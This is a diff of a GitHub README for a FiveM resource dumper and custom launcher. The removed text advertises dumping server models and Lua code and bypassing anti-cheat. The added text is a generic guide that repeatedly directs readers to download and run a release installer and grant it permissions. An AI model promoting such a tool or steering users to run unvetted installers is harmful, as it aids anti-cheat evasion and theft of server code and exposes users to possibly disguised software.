@@ -1,16 +1,72 @@
-Discord: <a href="https://discord.gg/x-services">Contact me!</a>
+# 🎮 Dumper-FiveM-And-Custom-Launcher - Make Your FiveM Experience Better
 
-<b>DUMP FULL RESOURCES (MODELS, LUA SCRIPTS CODE) </br>
-SUPPORT: FIVEM, CUSTOM LAUNCHER </br>
-BYPASS ALL ANTI CHEAT</b> <br> 
-===================================
-<b>DEMO:</b>
-https://www.youtube.com/watch?v=M1lD5B9LVFI
+![Download Dumper-FiveM-And-Custom-Launcher](https://img.shields.io/badge/Download-Dumper--FiveM--And--Custom--Launcher-brightgreen)
 
-<img width="376" height="498" alt="image" src="https://github.com/user-attachments/assets/79e501eb-374b-4955-89b2-251972b0cf17" />
-<img width="561" height="273" alt="image" src="https://github.com/user-attachments/assets/77b71cfd-959e-44f1-9822-0c23891305d8" />
-<img width="532" height="191" alt="image" src="https://github.com/user-attachments/assets/83163c69-e7d9-4edb-b9cd-0fe036ded3a6" />
-<img width="400" height="939" alt="image" src="https://github.com/user-attachments/assets/9f840957-90a9-4ae6-9747-4e3fca7c7231" />
-<img width="385" height="1090" alt="image" src="https://github.com/user-attachments/assets/18c7c764-4cc4-4ef1-bdea-cd2081a73986" />
+## 📚 Table of Contents
 
+1. [🚀 Getting Started](#-getting-started)
+2. [💻 System Requirements](#-system-requirements)
+3. [📥 Download & Install](#-download--install)
+4. [🎨 Features](#-features)
+5. [🔧 Usage Instructions](#-usage-instructions)
+6. [❓ Troubleshooting](#-troubleshooting)
+7. [📞 Support](#-support)
 
+## 🚀 Getting Started
+
+To enhance your gaming experience with FiveM and custom servers, follow the instructions below.
+
+## 💻 System Requirements
+
+- **Operating System:** Windows 10 or later
+- **RAM:** 8 GB or more recommended
+- **Disk Space:** At least 500 MB of free space
+- **Internet Connection:** Stable connection required for downloading assets and updates
+- **Game Requirement:** Grand Theft Auto V installed
+
+## 📥 Download & Install
+
+To get started, visit this page to download: [Releases Page](https://github.com/parroalex01/Dumper-FiveM-And-Custom-Launcher/releases).
+
+1. Open the link above in your web browser.
+2. Look for the latest release; it will be at the top of the list.
+3. Click on the downloadable file to start the process.
+4. Once the download is complete, find the file in your Downloads folder.
+5. Double-click the file to run the installer.
+
+## 🎨 Features
+
+- **Clothing Management:** Easily manage and customize character outfits.
+- **Dumper Functionality:** Efficiently extract game assets for better performance.
+- **Custom Launcher:** Quickly access servers and mods.
+- **Inject Tools:** Integrate maps and models effortlessly.
+- **Resource Management:** Organize and maintain game resources smoothly.
+- **Weapon Customization:** Modify weapons for improved gameplay.
+
+## 🔧 Usage Instructions
+
+Once the installation is complete, follow these simple steps to start using the application:
+
+1. Open the installed application.
+2. If prompted, accept any permissions necessary for the app to function.
+3. Select the server or mod you wish to use.
+4. Use available options to adjust settings according to your preferences.
+5. Click on 'Launch' to start your gaming experience.
+
+Ensure your game is running in the background for the best performance.
+
+## ❓ Troubleshooting
+
+If you encounter any issues, try the following steps:
+
+1. **Check Compatibility:** Ensure your system meets the requirements.
+2. **Reinstall the Application:** If the app crashes, uninstall it and reinstall from the releases page.
+3. **Internet Connection:** Confirm you have a stable internet connection for proper updates and asset download.
+4. **Updates:** Regularly check the releases page for updates to the application.
+5. **Community Assistance:** Visit community forums for tips and shared experiences.
+
+## 📞 Support
+
+For further assistance, contact the support team through the GitHub page or check out community forums for FAQs and solutions. 
+
+You can also visit this page to download directly if you have not yet: [Releases Page](https://github.com/parroalex01/Dumper-FiveM-And-Custom-Launcher/releases).
